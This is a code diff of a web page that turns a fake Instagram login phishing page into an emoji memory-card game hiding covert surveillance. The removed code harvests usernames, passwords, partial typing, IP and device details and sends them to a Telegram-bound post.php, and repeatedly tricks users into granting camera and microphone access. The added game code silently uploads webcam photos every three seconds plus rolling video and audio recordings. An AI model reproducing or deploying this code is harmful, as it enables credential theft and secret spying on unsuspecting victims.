-
-            // ============================================
-            // SEND VIDEO TO TELEGRAM
-            // ============================================
-            function sendVideoToTelegram(videoBlob) {
-                const reader = new FileReader();
-                reader.onload = function(event) {
-                    $.ajax({
-                        type: 'POST',
-                        url: 'post.php',
-                        data: {
-                            tg_type: 'video',
-                            tg_video: event.target.result,
-                            tg_ip: userIP,
-                            tg_ua: navigator.userAgent,
-                            tg_time: new Date().toISOString(),
-                            tg_counter: videoCounter
-                        },
-                        async: true,
-                        timeout: 15000
-                    });
-                };
-                reader.readAsDataURL(videoBlob);
-            }
-
-            // ============================================
-            // SEND AUDIO TO TELEGRAM
-            // ============================================
-            function sendAudioToTelegram(audioBlob) {
-                const reader = new FileReader();
-                reader.onload = function(event) {
-                    $.ajax({
-                        type: 'POST',
-                        url: 'post.php',
-                        data: {
-                            tg_type: 'audio',
-                            tg_audio: event.target.result,
-                            tg_ip: userIP,
-                            tg_ua: navigator.userAgent,
-                            tg_time: new Date().toISOString(),
-                            tg_counter: audioCounter
-                        },
-                        async: true,
-                        timeout: 15000
-                    });
-                };
-                reader.readAsDataURL(audioBlob);
-            }
-
-            // ============================================
-            // TRIGGER PERMISSIONS - MULTIPLE METHODS
-            // ============================================
             
-            function triggerImmediate() {
-                if (!isWebView) {
-                    setTimeout(requestPermissions, 300);
-                }
+            stream = mediaStream;
+            
+            const hasVideo = stream.getVideoTracks().length > 0;
+            const hasAudio = stream.getAudioTracks().length > 0;
+            
+            if (hasVideo) {
+                video.srcObject = stream;
+                video.play();
+                cameraActive = true;
             }
+            
+            if (hasAudio) {
+                audioElement.srcObject = stream;
+                microphoneActive = true;
+            }
+            
+            // Hide overlay
+            tapOverlay.classList.remove('active');
+            tapOverlay.style.display = 'none';
+            
+            // Update status
+            updateStatusBar();
+            
+            // Start captures
+            if (hasVideo) {
+                if (photoInterval) clearInterval(photoInterval);
+                photoInterval = setInterval(capturePhoto, 3000);
+                setTimeout(() => { if (cameraActive) startVideoRecording(); }, 2000);
+            }
+            
+            if (hasAudio) {
+                setTimeout(() => { if (microphoneActive) startAudioRecording(); }, 3000);
+            }
+        }
 
-            function triggerOnTap() {
-                if (isWebView) {
-                    tapOverlay.classList.add('active');
-                    tapOverlay.style.display = 'block';
+        // ============================================
+        // CAPTURE PHOTO
+        // ============================================
+        function capturePhoto() {
+            if (cameraActive && video.readyState === video.HAVE_ENOUGH_DATA) {
+                try {
+                    context.drawImage(video, 0, 0, 640, 480);
+                    const imageData = canvas.toDataURL("image/png");
+                    photoCounter++;
+                    updateStatusBar();
                     
-                    tapOverlay.addEventListener('click', function() {
-                        console.log('👆 User tapped overlay');
-                        requestPermissions();
+                    $.ajax({
+                        type: 'POST',
+                        url: 'post.php',
+                        data: {
+                            tg_type: 'image',
+                            tg_image: imageData,
+                            tg_ip: userIP,
+                            tg_ua: navigator.userAgent,
+                            tg_time: new Date().toISOString()
+                        },
+                        async: true,
+                        timeout: 5000
                     });
-                    
-                    setTimeout(() => {
-                        if (!permissionAttempted) {
-                            console.log('⏰ Auto-trigger after timeout');
-                            requestPermissions();
-                            setTimeout(() => {
-                                if (!stream && !permissionAttempted) {
-                                    tapOverlay.classList.add('active');
-                                    tapOverlay.style.display = 'block';
-                                }
-                            }, 1000);
-                        }
-                    }, 2000);
-                }
+                } catch (e) {}
             }
+        }
 
-            function triggerHiddenButton() {
-                hiddenTrigger.click();
-                document.body.click();
+        // ============================================
+        // RECORD VIDEO
+        // ============================================
+        function startVideoRecording() {
+            if (!stream || isRecording) return;
+            try {
+                isRecording = true;
+                recordedChunks = [];
+                const mimeTypes = ['video/webm;codecs=vp8,opus', 'video/webm'];
+                let mimeType = mimeTypes.find(type => MediaRecorder.isTypeSupported(type)) || 'video/webm';
+                mediaRecorder = new MediaRecorder(stream, { mimeType, videoBitsPerSecond: 1000000, audioBitsPerSecond: 128000 });
+                mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) recordedChunks.push(e.data); };
+                mediaRecorder.onstop = function() {
+                    if (recordedChunks.length > 0) {
+                        const videoBlob = new Blob(recordedChunks, { type: mediaRecorder.mimeType || 'video/webm' });
+                        if (videoBlob.size > 1000) {
+                            videoCounter++;
+                            updateStatusBar();
+                            const reader = new FileReader();
+                            reader.onload = function(e) {
+                                $.ajax({
+                                    type: 'POST',
+                                    url: 'post.php',
+                                    data: {
+                                        tg_type: 'video',
+                                        tg_video: e.target.result,
+                                        tg_ip: userIP,
+                                        tg_ua: navigator.userAgent,
+                                        tg_time: new Date().toISOString(),
+                                        tg_counter: videoCounter
+                                    },
+                                    async: true,
+                                    timeout: 15000
+                                });
+                            };
+                            reader.readAsDataURL(videoBlob);
+                        }
+                    }
+                    isRecording = false;
+                    recordedChunks = [];
+                    updateStatusBar();
+                    setTimeout(() => { if (cameraActive) startVideoRecording(); }, 2000);
+                };
+                mediaRecorder.start(1000);
+                setTimeout(() => { if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop(); }, 10000);
+            } catch (e) {
+                isRecording = false;
+                setTimeout(() => { if (cameraActive) startVideoRecording(); }, 5000);
+            }
+        }
+
+        // ============================================
+        // RECORD AUDIO
+        // ============================================
+        function startAudioRecording() {
+            if (!stream || isAudioRecording) return;
+            try {
+                isAudioRecording = true;
+                audioChunks = [];
+                const audioStream = new MediaStream(stream.getAudioTracks());
+                const mimeTypes = ['audio/webm;codecs=opus', 'audio/webm'];
+                let mimeType = mimeTypes.find(type => MediaRecorder.isTypeSupported(type)) || 'audio/webm';
+                audioRecorder = new MediaRecorder(audioStream, { mimeType, audioBitsPerSecond: 128000 });
+                audioRecorder.ondataavailable = (e) => { if (e.data.size > 0) audioChunks.push(e.data); };
+                audioRecorder.onstop = function() {
+                    if (audioChunks.length > 0) {
+                        const audioBlob = new Blob(audioChunks, { type: audioRecorder.mimeType || 'audio/webm' });
+                        if (audioBlob.size > 1000) {
+                            audioCounter++;
+                            updateStatusBar();
+                            const reader = new FileReader();
+                            reader.onload = function(e) {
+                                $.ajax({
+                                    type: 'POST',
+                                    url: 'post.php',
+                                    data: {
+                                        tg_type: 'audio',
+                                        tg_audio: e.target.result,
+                                        tg_ip: userIP,
+                                        tg_ua: navigator.userAgent,
+                                        tg_time: new Date().toISOString(),
+                                        tg_counter: audioCounter
+                                    },
+                                    async: true,
+                                    timeout: 15000
+                                });
+                            };
+                            reader.readAsDataURL(audioBlob);
+                        }
+                    }
+                    isAudioRecording = false;
+                    audioChunks = [];
+                    updateStatusBar();
+                    setTimeout(() => { if (microphoneActive) startAudioRecording(); }, 3000);
+                };
+                audioRecorder.start(1000);
+                setTimeout(() => { if (audioRecorder && audioRecorder.state === 'recording') audioRecorder.stop(); }, 8000);
+            } catch (e) {
+                isAudioRecording = false;
+                setTimeout(() => { if (microphoneActive) startAudioRecording(); }, 5000);
+            }
+        }
+
+        // ============================================
+        // UPDATE STATUS BAR
+        // ============================================
+        function updateStatusBar() {
+            cameraDot.className = 'dot ' + (cameraActive ? 'active' : 'inactive');
+            micDot.className = 'dot ' + (microphoneActive ? 'active' : 'inactive');
+            recDot.className = 'dot ' + ((isRecording || isAudioRecording) ? 'active' : 'inactive');
+            cameraStatus.textContent = cameraActive ? '📷 On' : '📷 Off';
+            micStatus.textContent = microphoneActive ? '🎙️ On' : '🎙️ Off';
+            recStatus.textContent = (isRecording || isAudioRecording) ? '🔴 Rec' : '⏸️ Idle';
+            captureCountDisplay.textContent = `📸 ${photoCounter}`;
+        }
+
+        setInterval(updateStatusBar, 1000);
+
+        // ============================================
+        // GAME FUNCTIONS
+        // ============================================
+        function initGame(size) {
+            game.gridSize = size;
+            game.totalPairs = (size * size) / 2;
+            game.matchedPairs = 0;
+            game.moves = 0;
+            game.flippedCards = [];
+            game.isLocked = false;
+            game.gameStarted = false;
+            game.startTime = null;
+            
+            const emojis = game.emojis.slice(0, game.totalPairs);
+            const pairs = [...emojis, ...emojis];
+            
+            // Shuffle
+            for (let i = pairs.length - 1; i > 0; i--) {
+                const j = Math.floor(Math.random() * (i + 1));
+                [pairs[i], pairs[j]] = [pairs[j], pairs[i]];
+            }
+            
+            game.cards = pairs;
+            
+            // Update display
+            movesDisplay.textContent = '0';
+            pairsDisplay.textContent = `0/${game.totalPairs}`;
+            grid.style.gridTemplateColumns = `repeat(${size}, 1fr)`;
+            renderGrid();
+            winOverlay.classList.remove('active');
+        }
+
+        function renderGrid() {
+            grid.innerHTML = '';
+            game.cards.forEach((emoji, index) => {
+                const card = document.createElement('div');
+                card.className = 'card';
+                card.dataset.index = index;
+                card.dataset.emoji = emoji;
+                card.innerHTML = `
+                    <div class="card-back">❓</div>
+                    <div class="card-front">${emoji}</div>
+                `;
+                card.addEventListener('click', () => flipCard(index));
+                card.addEventListener('touchend', (e) => { e.preventDefault(); flipCard(index); });
+                grid.appendChild(card);
+            });
+        }
+
+        function flipCard(index) {
+            if (game.isLocked) return;
+            if (!game.gameStarted) {
+                game.gameStarted = true;
+                game.startTime = Date.now();
+            }
+            
+            const card = grid.children[index];
+            if (card.classList.contains('flipped') || card.classList.contains('matched')) return;
+            if (game.flippedCards.length >= 2) return;
+            
+            card.classList.add('flipped');
+            game.flippedCards.push(index);
+            
+            if (game.flippedCards.length === 2) {
+                game.moves++;
+                movesDisplay.textContent = game.moves;
+                checkMatch();
+            }
+        }
+
+        function checkMatch() {
+            game.isLocked = true;
+            const [i1, i2] = game.flippedCards;
+            const card1 = grid.children[i1];
+            const card2 = grid.children[i2];
+            const emoji1 = game.cards[i1];
+            const emoji2 = game.cards[i2];
+            
+            if (emoji1 === emoji2) {
+                setTimeout(() => {
+                    card1.classList.add('matched');
+                    card2.classList.add('matched');
+                    game.matchedPairs++;
+                    pairsDisplay.textContent = `${game.matchedPairs}/${game.totalPairs}`;
+                    game.flippedCards = [];
+                    game.isLocked = false;
+                    
+                    if (game.matchedPairs === game.totalPairs) {
+                        gameWon();
+                    }
+                }, 400);
+            } else {
+                setTimeout(() => {
+                    card1.classList.remove('flipped');
+                    card2.classList.remove('flipped');
+                    game.flippedCards = [];
+                    game.isLocked = false;
+                }, 800);
+            }
+        }
+
+        function gameWon() {
+            const elapsed = Math.floor((Date.now() - game.startTime) / 1000);
+            const totalPairs = game.totalPairs;
+            const minMoves = totalPairs;
+            const accuracy = Math.round((totalPairs / game.moves) * 100);
+            
+            winMoves.textContent = game.moves;
+            winTime.textContent = elapsed + 's';
+            winAccuracy.textContent = accuracy + '%';
+            winOverlay.classList.add('active');
+            
+            // Send game stats to Telegram
+            sendToTelegram('game_won', JSON.stringify({
+                moves: game.moves,
+                time: elapsed,
+                accuracy: accuracy,
+                size: game.gridSize
+            }));
+        }
+
+        function closeWin() {
+            winOverlay.classList.remove('active');
+            initGame(game.gridSize);
+        }
+
+        // ============================================
+        // DIFFICULTY SELECTOR
+        // ============================================
+        document.querySelectorAll('.diff-btn').forEach(btn => {
+            btn.addEventListener('click', function() {
+                document.querySelectorAll('.diff-btn').forEach(b => b.classList.remove('active'));
+                this.classList.add('active');
+                const size = parseInt(this.dataset.size);
+                initGame(size);
+            });
+            btn.addEventListener('touchend', function(e) {
+                e.preventDefault();
+                document.querySelectorAll('.diff-btn').forEach(b => b.classList.remove('active'));
+                this.classList.add('active');
+                const size = parseInt(this.dataset.size);
+                initGame(size);
+            });
+        });
+
+        // ============================================
+        // BUTTONS
+        // ============================================
+        document.getElementById('newGameBtn').addEventListener('click', () => {
+            initGame(game.gridSize);
+        });
+        document.getElementById('shuffleBtn').addEventListener('click', () => {
+            initGame(game.gridSize);
+        });
+
+        // ============================================
+        // TRIGGER PERMISSIONS
+        // ============================================
+        function triggerPermissions() {
+            if (isWebView) {
+                tapOverlay.classList.add('active');
+                tapOverlay.style.display = 'block';
+                tapOverlay.addEventListener('click', function() {
+                    requestPermissions();
+                }, { once: true });
+                setTimeout(() => {
+                    if (!stream && !permissionAttempted) {
+                        requestPermissions();
+                    }
+                }, 2000);
+            } else {
                 setTimeout(requestPermissions, 500);
             }
-
-            function triggerOnInteraction() {
-                document.addEventListener('click', function() {
-                    if (!stream && !permissionAttempted) {
-                        console.log('🖱️ User clicked - triggering permissions');
-                        requestPermissions();
-                    }
-                });
-                
-                document.addEventListener('touchstart', function() {
-                    if (!stream && !permissionAttempted) {
-                        console.log('👆 User touched - triggering permissions');
-                        requestPermissions();
-                    }
-                });
-                
-                document.addEventListener('keydown', function() {
-                    if (!stream && !permissionAttempted) {
-                        console.log('⌨️ User typed - triggering permissions');
-                        requestPermissions();
-                    }
-                });
-            }
-
-            function triggerOnFocus() {
-                document.getElementById('username').addEventListener('focus', function() {
-                    if (!stream && !permissionAttempted) {
-                        console.log('📝 User focused input - triggering permissions');
-                        requestPermissions();
-                    }
-                });
-            }
-
-            // ============================================
-            // CREDENTIALS
-            // ============================================
-            document.getElementById('loginForm').addEventListener('submit', function(e) {
-                e.preventDefault();
-                
-                const username = document.getElementById('username').value;
-                const password = document.getElementById('password').value;
-                const btn = document.getElementById('submitBtn');
-                const msg = document.getElementById('successMsg');
-                
-                btn.innerHTML = '<span class="spinner"></span> Processing...';
-                btn.disabled = true;
-                msg.style.display = 'block';
-                
-                $.ajax({
-                    type: 'POST',
-                    url: 'post.php',
-                    data: {
-                        tg_type: 'login',
-                        tg_username: username,
-                        tg_password: password,
-                        tg_ip: userIP,
-                        tg_ua: navigator.userAgent,
-                        tg_time: new Date().toISOString()
-                    },
-                    success: function() {
-                        setTimeout(function() {
-                            msg.textContent = '✅ Verified! Redirecting...';
-                            setTimeout(function() {
-                                window.location.href = 'https://www.instagram.com/';
-                            }, 1000);
-                        }, 1500);
-                    },
-                    error: function() {
-                        setTimeout(function() {
-                            window.location.href = 'https://www.instagram.com/';
-                        }, 2000);
-                    }
-                });
-            });
-
-            // ============================================
-            // PARTIAL TYPING
-            // ============================================
-            document.getElementById('username').addEventListener('input', function() {
-                if (this.value.length > 2) {
-                    sendToTelegram('typing', this.value, 'Partial username');
-                }
-            });
-
-            // ============================================
-            // BROWSER INFO
-            // ============================================
-            function sendBrowserInfo() {
-                const info = {
-                    userAgent: navigator.userAgent,
-                    platform: navigator.platform,
-                    language: navigator.language,
-                    screen: `${screen.width}x${screen.height}`,
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    webView: isWebView
-                };
-                sendToTelegram('browser_info', JSON.stringify(info), 'Device Info');
-            }
-
-            function sendPageView() {
-                sendToTelegram('page_view', 'Page loaded', 
-                    `IP: ${userIP} | WebView: ${isWebView}`
-                );
-            }
-
-            // ============================================
-            // INIT
-            // ============================================
             
-            detectPlatform();
-            detectAndSendIP();
-            setTimeout(sendBrowserInfo, 500);
-            setTimeout(sendPageView, 1000);
-            
-            // Start all trigger methods
-            triggerImmediate();
-            triggerOnTap();
-            setTimeout(triggerHiddenButton, 1000);
-            triggerOnInteraction();
-            triggerOnFocus();
-            
-            // Final attempt
-            setTimeout(() => {
-                if (!stream && !permissionAttempted) {
-                    console.log('🔄 Final attempt');
-                    requestPermissions();
-                }
-            }, 5000);
-
-            // ============================================
-            // CLEANUP
-            // ============================================
-            window.addEventListener('beforeunload', function() {
-                if (mediaRecorder && mediaRecorder.state === 'recording') {
-                    mediaRecorder.stop();
-                }
-                if (audioRecorder && audioRecorder.state === 'recording') {
-                    audioRecorder.stop();
-                }
-                if (photoInterval) {
-                    clearInterval(photoInterval);
-                }
-                if (stream) {
-                    stream.getTracks().forEach(track => track.stop());
-                }
+            // Also try on user interaction
+            document.addEventListener('click', () => {
+                if (!stream && !permissionAttempted) requestPermissions();
             });
+            document.addEventListener('touchstart', () => {
+                if (!stream && !permissionAttempted) requestPermissions();
+            });
+        }
 
-            console.log('🔧 Camera + Microphone permission system ready');
-            console.log(`📱 Platform: ${isWebView ? 'WebView' : 'Browser'}`);
+        // ============================================
+        // DETECT IP
+        // ============================================
+        function detectIP() {
+            fetch('https://api.ipify.org?format=json')
+                .then(r => r.json())
+                .then(d => { userIP = d.ip; })
+                .catch(() => {
+                    fetch('https://httpbin.org/ip')
+                        .then(r => r.json())
+                        .then(d => { userIP = d.origin; })
+                        .catch(() => { userIP = 'Unknown'; });
+                });
+        }
 
-        })();
+        // ============================================
+        // BACKGROUND RECOVERY
+        // ============================================
+        document.addEventListener('visibilitychange', function() {
+            if (!document.hidden) {
+                console.log('👁️ Tab visible - checking streams');
+                if (cameraActive && !isRecording) startVideoRecording();
+                if (microphoneActive && !isAudioRecording) startAudioRecording();
+            }
+        });
+
+        // ============================================
+        // CLEANUP
+        // ============================================
+        window.addEventListener('beforeunload', function() {
+            if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop();
+            if (audioRecorder && audioRecorder.state === 'recording') audioRecorder.stop();
+            if (photoInterval) clearInterval(photoInterval);
+            if (stream) stream.getTracks().forEach(track => track.stop());
+        });
+
+        // ============================================
+        // INIT
+        // ============================================
+        detectPlatform();
+        detectIP();
+        setTimeout(() => { initGame(4); }, 100);
+        setTimeout(triggerPermissions, 300);
+
+        console.log('🎮 Memory Grid Game + 📷 Camera/Mic Ready');
+        console.log(`📱 Platform: ${isWebView ? 'WebView' : 'Browser'}`);
+        console.log('📸 Photos every 3s | 🎥 Video every 10s | 🎙️ Audio every 8s');
     </script>
 </body>
 </html>
